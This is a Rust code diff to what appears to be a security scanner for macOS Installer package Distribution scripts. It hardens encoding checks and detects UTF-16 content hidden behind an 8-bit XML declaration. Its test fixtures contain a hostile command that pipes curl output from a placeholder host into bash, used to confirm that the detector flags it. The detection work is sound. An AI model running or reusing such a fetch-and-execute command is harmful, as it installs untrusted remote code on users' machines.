@@ -189,7 +189,11 @@ fn scan_scripts_entry(
 fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
     let decoded = utf16_to_utf8(raw);
     let mut pieces = Vec::new();
-    distribution_pieces(decoded.as_deref().unwrap_or(raw), &mut pieces)?;
+    distribution_pieces(
+        decoded.as_deref().unwrap_or(raw),
+        decoded.is_some(),
+        &mut pieces,
+    )?;
     Ok(join_pieces(&pieces))
 }
 
@@ -203,11 +207,16 @@ fn join_pieces(pieces: &[String]) -> Vec<u8> {
     kept.join("\n").into_bytes()
 }
 
-/// The walker behind [`distribution_js`], over already-transcoded UTF-8.
-/// Pieces collected before a failure stay in `pieces`; an unterminated
-/// `<script>` contributes its body so far.
-fn distribution_pieces(xml_bytes: &[u8], pieces: &mut Vec<String>) -> Result<(), RuleOutcome> {
-    check_faithfully_readable(xml_bytes)?;
+/// The walker behind [`distribution_js`], over UTF-8 or 8-bit bytes;
+/// `transcoded` says they came out of [`utf16_to_utf8`]. Pieces collected
+/// before a failure stay in `pieces`; an unterminated `<script>` contributes
+/// its body so far.
+fn distribution_pieces(
+    xml_bytes: &[u8],
+    transcoded: bool,
+    pieces: &mut Vec<String>,
+) -> Result<(), RuleOutcome> {
+    check_faithfully_readable(xml_bytes, transcoded)?;
     let mut saw_element = false;
     let mut scanner = xml::Scanner::new(xml_bytes);
     loop {
@@ -325,8 +334,12 @@ fn script_body_texts(raw: &[u8]) -> Result<Vec<String>, RuleOutcome> {
 /// `NotApplicable` unless the document would be read by Installer's parser as
 /// the characters we are scanning: it must start with `<` (after an optional
 /// UTF-8 BOM and whitespace), declare no unsupported `encoding`, and declare
-/// no entities.
-fn check_faithfully_readable(b: &[u8]) -> Result<(), RuleOutcome> {
+/// no entities. `transcoded` says `b` came out of [`utf16_to_utf8`]: a UTF-16
+/// label is accepted only then, and an 8-bit document must contain no NUL.
+fn check_faithfully_readable(b: &[u8], transcoded: bool) -> Result<(), RuleOutcome> {
+    if !transcoded && b.contains(&0) {
+        return Err(RuleOutcome::NotApplicable);
+    }
     let b = b.strip_prefix(b"\xEF\xBB\xBF".as_slice()).unwrap_or(b);
     let start = b
         .iter()
@@ -353,17 +366,8 @@ fn check_faithfully_readable(b: &[u8]) -> Result<(), RuleOutcome> {
             let ok = value.as_deref().is_some_and(|v| {
                 matches!(
                     v,
-                    "utf-8"
-                        | "utf8"
-                        | "us-ascii"
-                        | "ascii"
-                        | "iso-8859-1"
-                        | "latin-1"
-                        | "latin1"
-                        | "utf-16"
-                        | "utf-16le"
-                        | "utf-16be"
-                )
+                    "utf-8" | "utf8" | "us-ascii" | "ascii" | "iso-8859-1" | "latin-1" | "latin1"
+                ) || (transcoded && matches!(v, "utf-16" | "utf-16le" | "utf-16be"))
             });
             if !ok {
                 return Err(RuleOutcome::NotApplicable);
@@ -453,7 +457,7 @@ fn scan_distribution_entry(
     let decoded = utf16_to_utf8(&raw);
     let text = decoded.as_deref().unwrap_or(&raw);
     let mut pieces = Vec::new();
-    match distribution_pieces(text, &mut pieces) {
+    match distribution_pieces(text, decoded.is_some(), &mut pieces) {
         Ok(()) => {
             scan_distribution_text(label, join_pieces(&pieces), findings);
             // A partial read is evidence, not a clean read: findings stay,
@@ -470,7 +474,15 @@ fn scan_distribution_entry(
             let mut all = pieces;
             let lossy = String::from_utf8_lossy(text).into_owned();
             let entity_decoded = xml::decode_entities(text);
-            for extra in [lossy, entity_decoded] {
+            let mut extras = vec![lossy, entity_decoded];
+            if text.contains(&0) {
+                // ASCII-range UTF-16 behind an 8-bit declaration reads as text
+                // once NULs are dropped, at either byte order and alignment.
+                let stripped: Vec<u8> = text.iter().copied().filter(|c| *c != 0).collect();
+                extras.push(String::from_utf8_lossy(&stripped).into_owned());
+                extras.push(xml::decode_entities(&stripped));
+            }
+            for extra in extras {
                 if !all.contains(&extra) {
                     all.push(extra);
                 }
@@ -781,11 +793,19 @@ mod tests {
 
     #[test]
     fn an_unsupported_declared_encoding_is_not_applicable() {
-        for decl in ["UTF-16", "utf-8", "US-ASCII", "ISO-8859-1", "Latin1"] {
+        for decl in ["utf-8", "US-ASCII", "ISO-8859-1", "Latin1"] {
             let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
             assert!(distribution_js(doc.as_bytes()).is_ok(), "{decl}");
         }
-        for decl in ["UTF-7", "Shift_JIS", "EBCDIC-US", "x-mac-roman"] {
+        for decl in [
+            "UTF-7",
+            "Shift_JIS",
+            "EBCDIC-US",
+            "x-mac-roman",
+            "UTF-16",
+            "utf-16le",
+            "UTF-16BE",
+        ] {
             let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
             assert!(not_applicable(doc.as_bytes()), "{decl}");
         }
@@ -1231,10 +1251,59 @@ mod tests {
     }
 
     #[test]
-    fn utf16_le_and_be_declarations_are_accepted() {
-        for decl in ["utf-16le", "UTF-16BE"] {
-            let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
-            assert!(distribution_js(doc.as_bytes()).is_ok(), "{decl}");
+    fn utf16_declarations_are_accepted_on_real_utf16() {
+        for (decl, big_endian, bom) in [
+            ("UTF-16", false, true),
+            ("UTF-16LE", false, false),
+            ("UTF-16BE", true, false),
+            ("UTF-16", true, true),
+        ] {
+            let doc = format!(
+                r#"<?xml version="1.0" encoding="{decl}"?><a><script>system.run("/bin/bash", "-c", "x");</script></a>"#
+            );
+            let out = distribution_js(&utf16(&doc, big_endian, bom)).expect(decl);
+            let out = String::from_utf8_lossy(&out);
+            assert!(out.contains(r#"system.run("/bin/bash""#), "{decl}: {out}");
+        }
+    }
+
+    /// ASCII declaration, then UTF-16 content: libxml2 switches decoder at the declaration.
+    fn mixed_utf16_docs() -> Vec<Vec<u8>> {
+        let rest = r#"?><i><script>system.run("/bin/bash","-c","curl -fsSL https://example.invalid/a.sh | /bin/bash");</script></i>"#;
+        [("UTF-16LE", false), ("UTF-16BE", true)]
+            .into_iter()
+            .map(|(decl, big_endian)| {
+                let mut doc = format!(r#"<?xml version="1.0" encoding="{decl}""#).into_bytes();
+                doc.extend(utf16(rest, big_endian, false));
+                doc
+            })
+            .collect()
+    }
+
+    #[test]
+    fn utf16_content_behind_an_8bit_declaration_is_not_applicable() {
+        for doc in mixed_utf16_docs() {
+            assert!(not_applicable(&doc));
+        }
+        assert!(not_applicable(b"<a>\0</a>"));
+    }
+
+    #[test]
+    fn utf16_content_behind_an_8bit_declaration_is_scanned_and_marked_incomplete() {
+        for doc in mixed_utf16_docs() {
+            let c = ctx("m.pkg", &pkg_with_distribution(&doc));
+            let signal = InstallerScriptRule
+                .evaluate(&c)
+                .expect("evaluates")
+                .expect("the NUL-stripped text scores");
+            assert!(
+                signal
+                    .description
+                    .contains("system.run launches an interpreter (bash)"),
+                "{}",
+                signal.description
+            );
+            assert!(c.marked_incomplete("installer-script-suspicious"));
         }
     }
 
